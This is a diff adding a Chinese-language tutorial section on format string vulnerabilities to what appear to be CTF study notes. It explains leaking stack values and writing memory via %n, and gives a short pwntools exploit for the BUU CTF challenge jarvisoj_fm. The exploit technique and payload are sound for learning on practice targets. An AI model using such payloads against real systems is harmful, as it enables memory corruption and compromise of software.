@@ -1188,3 +1188,129 @@ canary 形似：`00 aa bb cc dd ee ff 11`。
 
 ### 格式化字符串漏洞
 
+也称 fmt 攻击。
+
+`printf(format, a1, a2, a3, ...)` 是这样工作的：
+
+* 读取 format 字符串
+* 遇到 `%x/%p/%s/%n` 就去“参数列表”里取一个参数来用
+  * `%x`：取一个整数打印
+  * `%p`：取一个指针打印
+  * `%n`：取一个“指针”，往这个指针指向的地址写入输出长度
+
+假如输入了 `user_input`，要打印出来。
+
+正常写法是：
+
+```
+printf("%s", user_input);
+```
+
+输入的内容将以 `%s` 的格式输出。
+
+有漏洞的写法是：
+
+```
+printf(user_input);
+```
+
+用户输入的将被当作格式模板。
+
+比如输入 `%p %p %p %p ...` 或者 `%lx`，`printf` 会把它当成“打印指针/打印 64 位数”，然后从栈上一个个取值打印出来。
+
+因此可以泄露：
+
+* 栈上的 canary
+* 返回地址附近的值
+* libc 地址
+* PIE 基址
+
+还可以输入 `%n` 把当前已经输出的字符数写到一个地址里，可以修改：
+
+* 某个关键变量
+* GOT 表项
+* 栈上的返回地址
+
+但是 `printf(user_input);` 只有 format 本身，不存在 `a1 a2 ...` 等参数，根据 *ABI / 调用约定*，`printf` 会从固定的栈位置开始把“可变参数”当成一串 uint32_t 依次取出来。
+
+也就是说，如果我们的 payload 是 `p32(addr) + "%n"`，那么 `%n` 会从“第 1 个参数位置”取一个值当作地址写入，但是我们写入的 `addr` 在读入时，**大概率是填入了其他的参数槽位**。
+
+所以我们要找出第一个输入的位置对应的参数槽位，也就是 offset。
+
+那么如果我们要修改 `addr` 指向的变量，payload 应该等于 `p32(addr)+b'%offset$n'`。
+
+这里的 offset 指 **从 [ebp+8] 的 format 算第 1 个参数，往后数第 k 个参数槽位。**
+
+发送这个 payload，他先把 `addr` 填入对应的参数槽位，`%offset$n`然后再找到这个槽位，把这个参数的值取出并当作地址访问，把 `%` 前的 **输出长度** 填入。
+
+（地址的输出长度为 4）
+
+#### 找到 offset
+
+1. 用标记值定位
+
+发送 `AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x....`
+
+输出中出现 41414141 的那一项，就是你的 AAAA 被当成了第 k 个参数读到。
+
+2. 直接用 %k$p 去扫栈
+
+一次性打很多并带序号（方便数）：
+
+```
+%1$p %2$p %3$p ... %30$p
+
+```
+
+然后观察：
+
+* 哪些是 0xff....（栈）
+
+* 哪些出现 0x41414141
+
+* 哪些值看起来像要写入的地址
+
+
+#### 例题 1：jarvisoj_fm
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_fm)
+
+安全检查：
+
+<img width="347" height="126" alt="02dbe0c8ceb99d6f115a0ce83d59b0d3" src="https://github.com/user-attachments/assets/f599dd19-634a-4ba2-9533-bf90b1232359" />
+
+IDA 主函数伪代码：
+
+<img width="1280" height="448" alt="09af40d62dcbb31092abd2027a56db9f" src="https://github.com/user-attachments/assets/a74bedf6-4a6b-4cf6-9aac-929a8da2f6be" />
+
+发现 `printf(buf);` 存在格式化字符串漏洞，需要修改 `x=4`。
+
+<img width="1022" height="419" alt="image" src="https://github.com/user-attachments/assets/cb6bb3b3-6569-4d28-9863-59e39d8f1bcf" />
+
+IDA 查到 x 地址为 `x	0804A02C`。
+
+<img width="602" height="75" alt="image" src="https://github.com/user-attachments/assets/e93c3d60-45e1-47e8-9f89-b07c9231fc89" />
+
+offset = 11
+
+```
+# written by Sonnety
+from pwn import *
+context.arch = "i386"
+
+host = "node5.buuoj.cn"
+port = 28944
+x_addr = 0x804A02C
+
+def main():
+    io = remote(host,port)
+    payload = p32(x_addr) + b"%11$n"    # offset = 11
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+（tips：如果判断 x==5，就将 payload 改为 p32(x_addr) + b"A%11$n"）
+
